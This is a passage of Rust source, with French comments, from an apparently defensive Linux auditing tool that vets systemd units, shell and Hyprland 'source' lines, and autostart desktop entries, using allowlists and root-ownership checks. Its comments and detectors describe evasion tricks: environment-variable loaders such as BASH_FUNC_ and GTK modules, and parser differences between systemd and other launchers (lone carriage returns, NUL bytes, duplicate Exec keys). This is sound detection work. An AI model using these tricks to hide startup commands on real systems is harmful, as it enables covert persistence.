    use std::path::{Component, PathBuf};
    if !f.is_absolute() {
        return false;
    }
    // Les parties qui restent à traverser, la prochaine à la fin.
    let empiler = |pile: &mut Vec<std::ffi::OsString>, p: &Path| {
        for c in p.components().rev() {
            match c {
                Component::Normal(x) => pile.push(x.to_os_string()),
                Component::ParentDir => pile.push("..".into()),
                Component::RootDir | Component::CurDir | Component::Prefix(_) => {}
            }
        }
    };
    let racine = PathBuf::from("/");
    if !std::fs::symlink_metadata(&racine).is_ok_and(|m| tenue(&racine, &m)) {
        return false;
    }
    let mut pile = Vec::new();
    empiler(&mut pile, f);
    let mut fait = racine;
    let mut liens = 0usize;
    while let Some(partie) = pile.pop() {
        if partie == ".." {
            fait.pop();
            continue;
        }
        let suivant = fait.join(&partie);
        let Ok(m) = std::fs::symlink_metadata(&suivant) else {
            return false;
        };
        if !tenue(&suivant, &m) {
            return false;
        }
        if !m.file_type().is_symlink() {
            fait = suivant;
            continue;
        }
        liens = liens.saturating_add(1);
        let Ok(vers) = std::fs::read_link(&suivant) else {
            return false;
        };
        if liens > LIENS_SUIVIS_MAX {
            return false;
        }
        if vers.is_absolute() {
            fait = PathBuf::from("/");
        }
        empiler(&mut pile, &vers);
    }
    true
}

/// Un programme de la sauvegarde de Vanguard (env, findmnt, rsync), `f` lu sous `racine` : que seul root peut changer
/// (`de_root_seul`, F-4 de la relecture 0.94). Un programme du compte qui porte le même nom (~/bin/rsync) ne passe
/// jamais pour le vrai.
///
/// Dans les essais, qui tournent sous « unshare -r » où rien n'est à root seul, la racine d'essai tient lieu de
/// système : un fichier dont le chemin réel est sous son /usr compte pour à root, à condition que chaque entrée
/// traversée (`chemin_tenu`, V-2) le soit aussi : les dossiers au-dessus de la racine, son /usr et ce qui est dessous,
/// et un lien posé à même la racine (« bin » vers « usr/bin ») ; tout autre non. `de_root_seul` lui-même a ses propres
/// essais, dont un sur la vraie machine (`de_root_seul_juge_chaque_lien_en_vrai`). Limite dite (W-7, relecture 0.95) :
/// la vraie branche sur un programme de la sauvegarde n'a pas d'essai de bout en bout.
#[cfg(not(test))]
pub(super) fn programme_de_root_seul(_racine: &Path, f: &Path) -> bool {
    de_root_seul(f)
}

#[cfg(test)]
pub(super) fn programme_de_root_seul(racine: &Path, f: &Path) -> bool {
    let (Ok(canonique), Ok(reel)) = (std::fs::canonicalize(racine), std::fs::canonicalize(f)) else {
        return false;
    };
    let usr = canonique.join("usr");
    let tenue = |p: &Path, m: &std::fs::Metadata| {
        racine.starts_with(p)
            || canonique.starts_with(p)
            || p.starts_with(&usr)
            || (m.file_type().is_symlink() && p.parent() == Some(canonique.as_path()))
    };
    reel.starts_with(&usr) && chemin_tenu(f, &tenue)
}

/// La carte des identités de ce processus (/proc/self/uid_map) est celle du système, sans traduction : une seule
/// plage, 0 vers 0, sur toutes les identités.
fn uid_sans_traduction(carte: &str) -> bool {
    let lignes: Vec<Vec<&str>> = carte.lines().map(|l| l.split_whitespace().collect()).collect();
    lignes == [vec!["0", "0", "4294967295"]]
}

/// Un motif de nom de fichier (« * », « ? ») comparé à un nom, comme le fait un joker.
fn joker(motif: &[u8], nom: &[u8]) -> bool {
    match (motif.split_first(), nom.split_first()) {
        (None, None) => true,
        (Some((b'*', reste)), _) => joker(reste, nom) || nom.split_first().is_some_and(|(_, n)| joker(motif, n)),
        (Some((b'?', reste)), Some((_, n))) => joker(reste, n),
        (Some((m, reste)), Some((c, n))) if m == c => joker(reste, n),
        _ => false,
    }
}

/// Les fichiers qu'un fichier des variables (son `texte`) lit à son tour, écrits en toutes lettres, et les numéros des lignes
/// dont le « source » ne se suit pas. Hyprland (`hypr`) : « source = … », par un chemin absolu ou sous « ~/ », un
/// joker (« * », « ? ») seulement dans le dernier nom, suivi dans son dossier ; refusé sinon (variable, chemin
/// relatif, accolades), qui lirait on ne sait quoi. Shell : chaque « source » ou « . » en position de commande, même
/// au milieu d'une ligne (« [ -f x ] && . x », « if …; then . x; fi »), par un chemin absolu ou sous « ~/ »,
/// « $HOME/ », guillemets retirés ; un chemin calculé ou relatif ne se suit pas, et se dit dans le détail.
fn sources_lues(r: &Releveur, fichier: &Path, texte: &str, hypr: bool, montre: &str) -> SourcesLues {
    let maison = |reste: &str| r.maison.join(reste);
    let mut refus: Option<temoins::Refus> = None;
    let calcule = |l: &str| {
        temoins::Refus(trf!(
            "{montre} lit « {} », un fichier qui ne se dit pas en toutes lettres : les variables des sessions ne se vérifient pas",
            "{montre} reads “{}”, a file that is not spelled out: the session variables cannot be checked",
            crate::ui::couper(&crate::ui::affichable(l), 80)
        ))
    };
    let mut suivis = Vec::new();
    let mut non_suivies = Vec::new();
    let mut hypr_non_suivies = Vec::new();
    for (n, l) in texte.lines().enumerate() {
        let net = l.trim_matches([' ', '\t']);
        if net.starts_with('#') {
            continue;
        }
        if hypr
            && let Some(v) = net
                .strip_prefix("source")
                .map(|v| v.trim_start_matches([' ', '\t']))
                .and_then(|v| v.strip_prefix('='))
        {
            let v = v.split('#').next().unwrap_or_default().trim_matches([' ', '\t']);
            // Un chemin calculé (variable, guillemets) : ni suivi ni tu (relecture adverse, C7).
            if v.contains(['$', '[', '{', '`', '"', '\'']) || v.is_empty() {
                refus.get_or_insert(calcule(l));
                hypr_non_suivies.push((n.saturating_add(1), net.to_string(), NonSuivi::Calcule));
                continue;
            }
            // Un chemin relatif se lit depuis le dossier du fichier qui l'écrit, comme Hyprland (C7).
            let chemin = if let Some(reste) = v.strip_prefix("~/") {
                maison(reste)
            } else if v.starts_with('/') {
                r.sous(Path::new(&chemin_simplifie(v)))
            } else {
                let dossier = fichier.parent().unwrap_or(Path::new("/"));
                std::path::PathBuf::from(chemin_simplifie(&dossier.join(v).to_string_lossy()))
            };
            let nom = chemin.file_name().and_then(|x| x.to_str()).unwrap_or_default();
            let dossier = chemin.parent().unwrap_or(Path::new("/"));
            // Hyprland développe un joker partout dans le chemin (glob) ; Vanguard, dans le dernier nom seulement : le
            // reste se dit, jamais tu (deuxième vérification, N3).
            if dossier.to_string_lossy().contains(['*', '?']) {
                refus.get_or_insert(calcule(l));
                hypr_non_suivies.push((n.saturating_add(1), net.to_string(), NonSuivi::Joker));
                continue;
            }
            // Un fichier de Hyprland rangé dans un dossier temporaire : lu et jugé, et dit (N3). Un dossier caché du
            // dossier personnel, non : les dépôts de réglages (« ~/.dotfiles ») s'y rangent.
            if temporaire(sans_racine_de_proc(&chemin_simplifie(&r.montre(&chemin)))) {
                hypr_non_suivies.push((n.saturating_add(1), net.to_string(), NonSuivi::Temporaire));
            }
            if nom.contains(['*', '?']) {
                let mut trouves: Vec<std::path::PathBuf> = std::fs::read_dir(dossier)
                    .into_iter()
                    .flatten()
                    .flatten()
                    .filter(|e| {
                        e.file_name()
                            .to_str()
                            .is_some_and(|x| joker(nom.as_bytes(), x.as_bytes()))
                    })
                    .map(|e| e.path())
                    .collect();
                trouves.sort();
                suivis.extend(trouves);
            } else {
                suivis.push(chemin);
            }
            continue;
        }
        // Les mots de la ligne, les séparateurs de commandes à part : « ; », « & », « | », « ( », « ) ».
        let espace: String = net
            .chars()
            .map(|c| {
                if matches!(c, ';' | '&' | '|' | '(' | ')') {
                    ';'
                } else {
                    c
                }
            })
            .collect();
        let espace = espace.replace(';', " ; ");
        let mots: Vec<&str> = espace.split([' ', '\t']).filter(|m| !m.is_empty()).collect();
        let mut commande = true;
        let mut i = 0usize;
        let mut calculee = false;
        while let Some(mot) = mots.get(i).copied() {
            i = i.saturating_add(1);
            if mot == ";" {
                commande = true;
                continue;
            }
            if commande
                && matches!(
                    mot,
                    "then" | "else" | "do" | "if" | "elif" | "while" | "until" | "!" | "{"
                )
            {
                continue;
            }
            if commande && (mot == "." || mot == "source") {
                commande = false;
                let Some(cible) = mots.get(i).copied().filter(|m| *m != ";") else {
                    continue;
                };
                i = i.saturating_add(1);
                let cible: String = cible.chars().filter(|c| !matches!(c, '"' | '\'')).collect();
                let chemin = if let Some(reste) = cible
                    .strip_prefix("~/")
                    .or_else(|| cible.strip_prefix("$HOME/"))
                    .or_else(|| cible.strip_prefix("${HOME}/"))
                {
                    Some(maison(reste))
                } else if cible.starts_with('/') {
                    Some(r.sous(Path::new(&cible)))
                } else {
                    None
                };
                match chemin {
                    Some(c)
                        if !c
                            .to_string_lossy()
                            .contains(['$', '`', '*', '?', '[', '{', '<', '>', '\\']) =>
                    {
                        suivis.push(c);
                    }
                    _ => calculee = true,
                }
                continue;
            }
            commande = false;
        }
        if calculee {
            non_suivies.push(n.saturating_add(1));
        }
    }
    SourcesLues {
        suivis,
        non_suivies,
        hypr_non_suivies,
        refus,
    }
}

/// Ce que `sources_lues` trouve dans un fichier : les fichiers qu'il lit, les numéros des lignes du shell dont le
/// « source » se calcule, les « source = » de Hyprland à dire (numéro, ligne, pourquoi), le premier refus.
struct SourcesLues {
    suivis: Vec<std::path::PathBuf>,
    non_suivies: Vec<usize>,
    hypr_non_suivies: Vec<(usize, String, NonSuivi)>,
    refus: Option<temoins::Refus>,
}

/// L'environnement relevé (`environnement`), à lier à une ligne ; son refus sinon.
fn environnement_lie(r: &Releveur) -> Result<(String, temoins::Etat), temoins::Refus> {
    r.environnement.clone().unwrap_or_else(|| {
        Err(temoins::Refus(
            tr!(
                "les variables des sessions n'ont pas été relevées",
                "the session variables were not recorded"
            )
            .to_string(),
        ))
    })
}

/// Le refus d'un fichier dont le contenu ou le chemin n'est pas de l'UTF-8.
fn octet_refuse(fichier: &str) -> temoins::Refus {
    temoins::Refus(trf!(
        "{fichier} contient un octet qui n'est pas du texte (UTF-8) : ce qui se montre ne serait pas ce qui se lance",
        "{fichier} contains a byte that is not text (UTF-8): what is shown would not be what is started"
    ))
}

/// Au plus autant de fichiers d'ajout (drop-ins) liés pour une unité.
const AJOUTS_MAX: usize = 32;
/// Un fichier d'ajout plus gros n'est pas une configuration.
const AJOUT_MAX: u64 = 1024 * 1024;

/// Les seules directives d'une unité (ou d'un ajout) qui se déclare normale, par section : décrire, ordonner, relancer,
/// borner le temps, la priorité, et les lignes Exec, toutes liées (`lignes_exec`). Toute autre directive (variables
/// lues ailleurs, dossier de travail, racine, dossiers privés ou montés, identifiants, PAM, unité lancée en cas
/// d'échec…) rend la ligne non déclarable : décider par une liste de ce qui est dangereux se contournait à chaque
/// directive oubliée (deuxième vérification de la campagne E, P2) ; on décide par ce qui est sûr.
const DIRECTIVES_PERMISES: [(&str, &[&str]); 3] = [
    (
        "Unit",
        &[
            "Description",
            "Documentation",
            "After",
            "Before",
            // Seulement des cibles (`dependance_permise`) : une cible ne lance rien elle-même.
            "Wants",
            "Requires",
            "PartOf",
            "StartLimitIntervalSec",
            "StartLimitBurst",
        ],
    ),
    (
        "Service",
        &[
            "Type",
            // Le compte qui lance, pas ce qui est lancé (les chemins de la ligne sont absolus et liés) ; et une
            // directive qui ne fait que retirer des droits.
            "User",
            "Group",
            "NoNewPrivileges",
            "ExecStart",
            "ExecStartPre",
            "ExecStartPost",
            "ExecCondition",
            "ExecReload",
            "ExecStop",
            "ExecStopPost",
            "Restart",
            "RestartSec",
            "RemainAfterExit",
            "TimeoutSec",
            "TimeoutStartSec",
            "TimeoutStopSec",
            "Nice",
            // Des noms de `variable_permise` seulement, sans chemin en valeur.
            "Environment",
            "PassEnvironment",
        ],
    ),
    ("Install", &["WantedBy"]),
];

/// Les directives qui lancent une commande : chacune est montrée et liée comme la ligne signalée.
const DIRECTIVES_EXEC: [&str; 7] = [
    "ExecStart",
    "ExecStartPre",
    "ExecStartPost",
    "ExecCondition",
    "ExecReload",
    "ExecStop",
    "ExecStopPost",
];

/// Une dépendance permise (Wants=, Requires=, PartOf=, WantedBy=) : des cibles seulement (« default.target »,
/// « graphical-session.target ») ; une autre unité nommée là serait lancée avec celle-ci, sans être liée.
fn dependance_permise(valeur: &str) -> bool {
    let noms: Vec<&str> = valeur.split([' ', '\t']).filter(|n| !n.is_empty()).collect();
    !noms.is_empty()
        && noms.iter().all(|n| {
            n.strip_suffix(".target")
                .is_some_and(|b| !b.is_empty() && b.bytes().all(|o| o.is_ascii_alphanumeric() || b"-_@.".contains(&o)))
        })
}

/// Les seules variables qu'« Environment= » et « PassEnvironment= » peuvent poser dans une unité qui se déclare
/// normale : l'écran, la langue, le fuseau, le terminal. Aucune ne fait charger du code ni ne change où un programme
/// le cherche. Décider par une liste de ce qui est dangereux se contournait (modules GTK, pilotes GL, BASH_FUNC_…,
/// vérification de la campagne E) : on décide par ce qui est sûr.
fn variable_permise(nom: &str) -> bool {
    const NOMS: [&str; 12] = [
        "DISPLAY",
        "WAYLAND_DISPLAY",
        "LANG",
        "LANGUAGE",
        "TZ",
        "TERM",
        "COLORTERM",
        "NO_COLOR",
        "XDG_SESSION_TYPE",
        "XDG_CURRENT_DESKTOP",
        "XDG_SESSION_DESKTOP",
        "DESKTOP_SESSION",
    ];
    NOMS.contains(&nom)
        || nom
            .strip_prefix("LC_")
            .is_some_and(|r| !r.is_empty() && r.bytes().all(|b| b.is_ascii_uppercase()))
}

/// Les mots d'une valeur de systemd (« Environment= »), coupés sur l'espace et la tabulation hors guillemets,
/// guillemets retirés ; `None` : un échappement (« \ »), que systemd décode (« \x5f » est « _ ») avant de lire le nom
/// (vérification de la campagne E, N3), ou un guillemet non fermé.
fn mots_de_systemd(valeur: &str) -> Option<Vec<String>> {
    if valeur.contains('\\') {
        return None;
    }
    let mut mots = Vec::new();
    let mut mot = String::new();
    let mut dans: Option<char> = None;
    for c in valeur.chars() {
        match (dans, c) {
            (Some(q), c) if c == q => dans = None,
            (None, '"' | '\'') => dans = Some(c),
            (None, ' ' | '\t') => {
                if !mot.is_empty() {
                    mots.push(std::mem::take(&mut mot));
                }
            }
            (_, c) => mot.push(c),
        }
    }
    if dans.is_some() {
        return None;
    }
    if !mot.is_empty() {
        mots.push(mot);
    }
    Some(mots)
}

/// Ce que valent les codes « % » de systemd pour une unité (systemd.unit(5), « Specifiers ») : de l'utilisateur
/// (`maison`, `session` : son XDG_RUNTIME_DIR) ou du système.
struct Codes {
    utilisateur: bool,
    maison: String,
    session: Option<String>,
    /// Les variables posées par « Environment= » dans l'unité : systemd remplace « $A » et « ${A} » des lignes Exec
    /// par leur valeur (relecture adverse 2, N5).
    variables: std::collections::BTreeMap<String, String>,
    /// Le dossier courant de ses lignes Exec (`dossier_courant`) : `None`, le dossier personnel.
    courant: Option<String>,
    /// La sauvegarde que Vanguard pose, si l'unité lue est ce service-là, écrit à l'octet près comme Vanguard l'écrit
    /// (`sauvegarde::sauvegarde_posee`) ; seuls son rsync et son findmnt se taisent, s'ils sont les vrais et si sa
    /// destination se voit sans lien (relecture 0.94, S-1, C-2).
    sauvegarde: Option<crate::sauvegarde::SauvegardePosee>,
    /// La sauvegarde reconnue, mais un complément que le compte peut écrire s'y ajoute (`complements_du_compte`) : la
    /// forme exacte n'est plus acceptée (D-1 : il changerait HOME, donc le ~/.popt que lit rsync).
    sauvegarde_completee: bool,
    /// La sauvegarde reconnue, mais un fichier de variables du gestionnaire de systemd du compte nomme HOME ou une
    /// variable que lisent rsync, findmnt ou le chargeur, ou ne se lit pas (`environnement_change_la_sauvegarde`, F-1).
    sauvegarde_environnement: bool,
}

impl Codes {
    /// Les codes d'une unité du compte (`utilisateur`) ou du système lue sous `r`, sans variables.
    fn de(utilisateur: bool, r: &Releveur) -> Self {
        Self {
            utilisateur,
            maison: r.maison.to_string_lossy().into_owned(),
            session: r.session.as_ref().map(|s| s.to_string_lossy().into_owned()),
            variables: std::collections::BTreeMap::new(),
            courant: (!utilisateur).then(|| "/".to_string()),
            sauvegarde: None,
            sauvegarde_completee: false,
            sauvegarde_environnement: false,
        }
    }
}

/// Les variables qu'une unité (`texte`) pose à ses lignes Exec, ajoutées à `variables` : « Environment= » et
/// « EnvironmentFile= » de ses seules sections `[Service]` et `[Socket]` (vérification 3, P2 : ailleurs, systemd les
/// ignore), leurs codes « % » développés. Une variable posée à deux valeurs différentes (unité et ajouts, ou fichier
/// de variables) vaut `CODE_INCONNU` : ce qu'elle lance ne se connaît pas sans l'ordre exact de systemd.
fn variables_d_unite(
    texte: &str,
    codes: &Codes,
    r: &Releveur,
    variables: &mut std::collections::BTreeMap<String, String>,
) {
    let mut poser = |nom: &str, v: String| {
        let v = match variables.get(nom) {
            Some(avant) if *avant != v => CODE_INCONNU.to_string(),
            _ => v,
        };
        variables.insert(nom.to_string(), v);
    };
    let mut section: Option<String> = None;
    for l in lignes_de_systemd(texte) {
        if let Some(nom) = l.texte.strip_prefix('[').and_then(|x| x.strip_suffix(']')) {
            section = Some(nom.to_string());
            continue;
        }
        if !matches!(section.as_deref(), Some("Service" | "Socket")) {
            continue;
        }
        let Some((cle, valeur)) = l.texte.split_once('=') else {
            continue;
        };
        let Some(valeur) = developper_codes(valeur.trim_matches([' ', '\t']), codes) else {
            continue;
        };
        match cle.trim_matches([' ', '\t']) {
            "Environment" => {
                for mot in commandes_de_systemd_brutes(&valeur).into_iter().flatten().flatten() {
                    if let Some((nom, v)) = affectation(&mot) {
                        poser(nom, v.to_string());
                    }
                }
            }
            "EnvironmentFile" => {
                let chemin = valeur.strip_prefix('-').unwrap_or(&valeur);
                if chemin.starts_with('/')
                    && let Ok(lues) = permise::lire_variables(&r.sous(Path::new(chemin)))
                {
                    for (nom, v) in lues {
                        poser(&nom, v);
                    }
                }
            }
            _ => {}
        }
    }
}

/// Les variables d'une unité du compte fusionnées avec celles de son fichier principal et de ses ajouts
/// (« x.service.d/*.conf ») de tous les dossiers que lit systemd (vérification 3, P8 : un ajout qui change la valeur
/// d'une variable change ce que lance l'unité) ; seulement si une ligne en emploie (« $ »).
fn variables_fusionnees(
    f: &Path,
    texte: &str,
    codes: &Codes,
    r: &Releveur,
) -> std::collections::BTreeMap<String, String> {
    let mut variables = std::collections::BTreeMap::new();
    variables_d_unite(texte, codes, r, &mut variables);
    if !texte.contains('$') {
        return variables;
    }
    for autre in autres_textes_de_l_unite(f, codes, r) {
        if let Ok(lu) = temoins::lire_borne(&autre, AJOUT_MAX) {
            variables_d_unite(&String::from_utf8_lossy(&lu.octets), codes, r, &mut variables);
        }
    }
    variables
}

/// Les autres fichiers d'une unité que `f` (son fichier principal, ou l'un de ses ajouts) : son fichier principal et
/// ses ajouts (« x.service.d/*.conf ») de tous les dossiers que lit systemd, au plus `AJOUTS_MAX`.
fn autres_textes_de_l_unite(f: &Path, codes: &Codes, r: &Releveur) -> Vec<std::path::PathBuf> {
    let nom_de = |p: &Path| p.file_name().map(|n| n.to_string_lossy().into_owned());
    let parent = f.parent().and_then(nom_de);
    let unite = match parent.as_deref().and_then(|p| p.strip_suffix(".d")) {
        Some(u) if a_l_extension(f, "conf") => u.to_string(),
        _ => nom_de(f).unwrap_or_default(),
    };
    let Ok(dossiers) = dossiers_d_unites(r, codes.utilisateur) else {
        return Vec::new();
    };
    let mut principaux = vec![unite.clone()];
    if let Some((gabarit, apres)) = unite.split_once('@')
        && let Some((_, genre)) = apres.rsplit_once('.')
    {
        principaux.push(format!("{gabarit}@.{genre}"));
    }
    let mut textes: Vec<std::path::PathBuf> = Vec::new();
    if let Some(principal) = dossiers
        .iter()
        .flat_map(|d| principaux.iter().map(move |p| d.join(p)))
        .find(|p| p.is_file())
    {
        textes.push(principal);
    }
    for d in &dossiers {
        for ajout in ajouts_de(&unite) {
            let mut confs = fichiers_de(&d.join(ajout), &["conf"]);
            confs.sort();
            textes.extend(confs);
        }
    }
    textes.retain(|p| p.as_path() != f);
    textes.truncate(AJOUTS_MAX);
    textes
}

/// X-3 (relecture 0.95) : le dossier courant des lignes Exec d'une unité, d'où se lit un argument relatif
/// (`permise::Systeme::courant`) : la valeur de « WorkingDirectory= » de ses sections, celles de ses ajouts comprises,
/// codes « % » développés ; sans elle, le dossier personnel pour une unité du compte (`None`) et « / » pour une
/// unité du système (systemd.exec(5)). Deux valeurs différentes (l'ordre exact de systemd n'est pas refait), ou une
/// valeur que systemd ignore ou que Vanguard ne résout pas exactement (`dossier_sur`, Y-1 : un seul « - » se retire,
/// un code « % » dont la vraie valeur n'est pas connue), ou une valeur à « - » (Z-1 : systemd lance quand même si le
/// dossier manque) : `CODE_INCONNU`, jamais un dossier deviné ; un relatif n'y est pas vérifié, donc pas tu. Une
/// ligne sans argument relatif n'en est pas changée.
fn dossier_courant(f: &Path, texte: &str, codes: &Codes, r: &Releveur) -> Option<String> {
    let defaut = codes.courant.clone();
    let mut valeurs: std::collections::BTreeSet<Option<String>> = std::collections::BTreeSet::new();
    let mut lire = |texte: &str| {
        for l in lignes_de_systemd(texte) {
            let Some((cle, valeur)) = l.texte.split_once('=') else {
                continue;
            };
            if cle.trim_matches([' ', '\t']) != "WorkingDirectory" {
                continue;
            }
            let v = valeur.trim_matches([' ', '\t']);
            // Z-1 (revérification 5) : avec « - », un dossier absent n'arrête pas systemd et le programme se lance
            // ailleurs (maison ou « / ») ; le dossier peut aussi disparaître entre le bilan et le lancement.
            let tolere = v.starts_with('-');
            let v = v.strip_prefix('-').unwrap_or(v);
            valeurs.insert(if v.is_empty() {
                defaut.clone()
            } else if tolere {
                Some(CODE_INCONNU.to_string())
            } else if v == "~" {
                if codes.utilisateur {
                    None
                } else {
                    Some("/root".to_string())
                }
            } else {
                match developper_codes(v, codes) {
                    Some(d) if codes_connus(v) && dossier_sur(&d) => Some(d),
                    _ => Some(CODE_INCONNU.to_string()),
                }
            });
        }
    };
    lire(texte);
    for autre in autres_textes_de_l_unite(f, codes, r) {
        match temoins::lire_borne(&autre, AJOUT_MAX) {
            Ok(lu) => lire(&String::from_utf8_lossy(&lu.octets)),
            Err(_) => lire(&format!("WorkingDirectory={CODE_INCONNU}")),
        }
    }
    let mut valeurs = valeurs.into_iter();
    match (valeurs.next(), valeurs.next()) {
        (None, _) => defaut,
        (Some(v), None) => v,
        (Some(_), Some(_)) => Some(CODE_INCONNU.to_string()),
    }
}

/// Y-1 (revérification 4) : un dossier courant que systemd prend tel quel : absolu, sans partie « .. » (systemd dit
/// « not normalized, ignoring » et garde le dossier personnel) ni « . » (plus strict que systemd : un doute rend
/// « non vérifié », jamais muet), sans « - » de plus (« --/x » : « not absolute, ignoring »), sans variable, code non
/// résolu ni échappement. Une barre doublée ou finale (« %h » d'une maison écrite « /home/alice/ ») est permise.
fn dossier_sur(d: &str) -> bool {
    d.starts_with('/') && !d.contains(['$', '\\', CODE_INCONNU]) && d.split('/').all(|p| p != "." && p != "..")
}

/// Y-1 (revérification 4) : une valeur dont chaque code « % » a une vraie valeur connue de Vanguard
/// (`developper_codes`) ; %u, %U, %g, %G, %H… y deviennent « x » : un dossier courant qui en contient n'est pas sûr.
fn codes_connus(v: &str) -> bool {
    let mut lettres = v.chars();
    while let Some(c) = lettres.next() {
        if c == '%' && !lettres.next().is_some_and(|x| "%hTVtSCLED".contains(x)) {
            return false;
        }
    }
    true
}

/// X-3 (relecture 0.95) : le dossier courant d'une entrée de bureau, sa clé « Path= » (systemd-xdg-autostart-generator
/// en fait le WorkingDirectory= du service) : `None` sans elle ou vide (le dossier personnel ; le générateur écrit
/// alors « WorkingDirectory=- », que `dossier_courant` lit aussi comme le défaut) ; sinon `CODE_INCONNU` (A-1,
/// revérification 6 : le générateur 262.1 écrit toujours « `WorkingDirectory=-<Path>` », et avec « - » un dossier
/// absent n'arrête pas systemd, comme Z-1) : un argument relatif n'y est pas vérifié, donc pas tu. B-1
/// (revérification 7) : un Path= non vide de l'une ou l'autre lecture de `cles_de_bureau` suffit, même s'il n'est
/// pas le premier : le générateur garde la première clé, d'autres lanceurs la dernière.
fn dossier_de_bureau(texte: &str) -> Option<String> {
    cles_de_bureau(texte)
        .iter()
        .any(|c| c.cle == "Path" && !c.valeur.is_empty())
        .then(|| CODE_INCONNU.to_string())
}

/// Une clé du groupe [Desktop Entry] d'une entrée de bureau, lue par `cles_de_bureau`.
struct CleDeBureau {
    /// Le numéro de sa ligne, compté en « \n » (à partir de 1).
    numero: usize,
    /// Vrai si elle vient de la lecture de systemd, faux de la lecture large.
    systemd: bool,
    cle: String,
    valeur: String,
}

/// B-1 (revérification 7) : les clés du groupe [Desktop Entry] d'une entrée de bureau, toutes et dans l'ordre, de
/// deux lectures. Celle de systemd-xdg-autostart-generator (`lignes_de_systemd`, mesuré sur 262.1 : fins de ligne
/// « \n », « \r » et « \0 », marque BOM ôtée à chaque ligne, suite par « \ ») ; puis une lecture large, ligne à
/// ligne sans suite, la marque BOM et les blancs ASCII (dont « \x0b » et « \x0c », comme GLib) ôtés autour : ce
/// que lit un autre lanceur. Les commentaires « # » et « ; » sont sautés ; la clé et la valeur perdent leurs blancs.
fn cles_de_bureau(texte: &str) -> Vec<CleDeBureau> {
    let large = |c: char| c == '\u{FEFF}' || c.is_ascii_whitespace() || c == '\u{b}';
    // Le numéro en « \n » de chaque ligne lue de la lecture large.
    let numero = |debut: usize| {
        texte
            .get(..debut)
            .map_or(0, |a| a.matches('\n').count())
            .saturating_add(1)
    };
    let lectures = lignes_de_systemd(texte)
        .into_iter()
        .map(|l| (l.numero, true, l.texte))
        .chain(
            lignes_lues_par_systemd(texte)
                .into_iter()
                .map(|(debut, l)| (numero(debut), false, l.trim_matches(large).to_string())),
        );
    let mut cles = Vec::new();
    let mut groupe = (true, String::new());
    for (numero, systemd, l) in lectures {
        if groupe.0 != systemd {
            groupe = (systemd, String::new());
        }
        if l.starts_with(['#', ';']) {
            continue;
        }
        if let Some(nom) = l.strip_prefix('[').and_then(|x| x.strip_suffix(']')) {
            groupe.1 = nom.to_string();
            continue;
        }
        let Some((cle, valeur)) = l.split_once('=') else {
            continue;
        };
        if groupe.1 == "Desktop Entry" {
            cles.push(CleDeBureau {
                numero,
                systemd,
                cle: cle.trim_matches(large).to_string(),
                valeur: valeur.trim_matches(large).to_string(),
            });
        }
    }
    cles
}

/// B-1 (revérification 7) : les formes d'une entrée de bureau que systemd-xdg-autostart-generator lit autrement qu'un
/// autre lanceur peut la lire, chacune une fois, avec sa ligne (à partir de 0) : un retour chariot seul suivi d'autre
/// chose ou un octet nul (une fin de ligne pour systemd, mesuré sur 262.1), une marque d'ordre des octets (ôtée par
/// systemd), une suite par « \\ » (systemd la joint, GLib non), une clé du lancement (`CLES_DU_LANCEMENT`) du groupe
/// [Desktop Entry] écrite deux fois avec des valeurs différentes (systemd garde la première, GLib la dernière). Le
/// texte de chaque forme se dit dans la langue de l'interface.
fn formes_trompeuses(texte: &str) -> Vec<(usize, String)> {
    // C-2 (revérification 8) : une clé en double ne se dit que si elle décide du lancement (ce que lance l'entrée,
    // d'où, si elle se lance et quand) : celles que lit systemd-xdg-autostart-generator 262.1 (relevées dans le
    // programme) et celles des autres lanceurs ou de `lenteur` ; un nom ou une icône en double n'y change rien.
    const CLES_DU_LANCEMENT: [&str; 13] = [
        "Exec",
        "TryExec",
        "Path",
        "Type",
        "Hidden",
        "OnlyShowIn",
        "NotShowIn",
        "X-systemd-skip",
        "AutostartCondition",
        "X-KDE-autostart-condition",
        "X-GNOME-Autostart-Phase",
        "X-GNOME-Autostart-enabled",
        "X-GNOME-Autostart-Delay",
    ];
    let ligne = |octet: usize| texte.get(..octet).map_or(0, |a| a.matches('\n').count());
    let octets = texte.as_bytes();
    let mut formes = Vec::new();
    // C-2 (revérification 8) : un « \r » seul qui finit le fichier ne coupe aucune ligne qui suive ; seul celui du
    // milieu se dit.
    let retour_seul = octets
        .iter()
        .enumerate()
        .position(|(i, &b)| b == b'\r' && octets.get(i.saturating_add(1)).is_some_and(|suivant| *suivant != b'\n'));
    if let Some(i) = retour_seul {
        formes.push((
            ligne(i),
            tr!(
                "un retour chariot seul (« \\r »), une fin de ligne pour systemd",
                "a lone carriage return (\"\\r\"), a line end for systemd"
            )
            .to_string(),
        ));
    }
    if let Some(i) = texte.find('\0') {
        formes.push((
            ligne(i),
            tr!(
                "un octet nul, une fin de ligne pour systemd",
                "a NUL byte, a line end for systemd"
            )
            .to_string(),
        ));
    }
    if let Some(i) = texte.find('\u{FEFF}') {
        formes.push((
            ligne(i),
            tr!(
                "une marque d'ordre des octets (U+FEFF), ôtée par systemd",
                "a byte order mark (U+FEFF), stripped by systemd"
            )
            .to_string(),
        ));
    }
    if let Some(l) = lignes_de_systemd(texte).iter().find(|l| l.lues > 1) {
        formes.push((
            l.numero.saturating_sub(1),
            tr!(
                "une ligne finie par « \\ », que systemd seul joint à la suivante",
                "a line ending in \"\\\", which only systemd joins to the next one"
            )
            .to_string(),
        ));
    }
    let cles = cles_de_bureau(texte);
    let double = cles.iter().enumerate().find_map(|(i, c)| {
        cles.get(..i)?
            .iter()
            .any(|a| a.systemd == c.systemd && a.cle == c.cle && a.valeur != c.valeur)
            .then_some(c)
            .filter(|c| CLES_DU_LANCEMENT.contains(&c.cle.as_str()))
    });
    if let Some(c) = double {
        let cle = crate::ui::affichable(&c.cle.chars().take(40).collect::<String>());
        formes.push((
            c.numero.saturating_sub(1),
            trf!(
                "la clé « {cle} » écrite deux fois avec des valeurs différentes (systemd garde la première, d'autres lanceurs la dernière)",
                "the key \"{cle}\" written twice with different values (systemd keeps the first, other launchers the last)"
            ),
        ));
    }
    formes
}

/// Un mot d'une ligne Exec, ses variables remplacées comme les remplace systemd (« $$ » : « $ » ; « $HOME »
/// gardé) ; `None` si l'une n'a pas de valeur connue.
fn developper_variables(mot: &str, variables: Option<&std::collections::BTreeMap<String, String>>) -> Option<String> {
    if !mot.contains('$') {
        return Some(mot.to_string());
    }
    let mut sortie = String::with_capacity(mot.len());
    let mut reste = mot;
    while let Some(i) = reste.find('$') {
        sortie.push_str(reste.get(..i)?);
        let apres = reste.get(i.saturating_add(1)..)?;
        let (nom, suite) = if let Some(r) = apres.strip_prefix('$') {
            sortie.push('$');
            reste = r;
